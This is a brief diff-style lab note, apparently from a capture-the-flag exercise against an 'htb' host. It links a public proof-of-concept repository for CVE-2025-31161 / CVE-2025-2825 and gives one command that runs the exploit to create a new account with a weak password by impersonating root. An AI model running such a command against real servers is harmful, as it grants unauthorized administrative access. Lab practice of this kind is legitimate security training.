@@ -1,0 +1,4 @@
+Immersive-Labs-Sec/CVE-2025-31161: Proof of Concept for CVE-2025-31161 / CVE-2025-2825
+: https://github.com/Immersive-Labs-Sec/CVE-2025-31161
+
+python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user hyh --password admin123
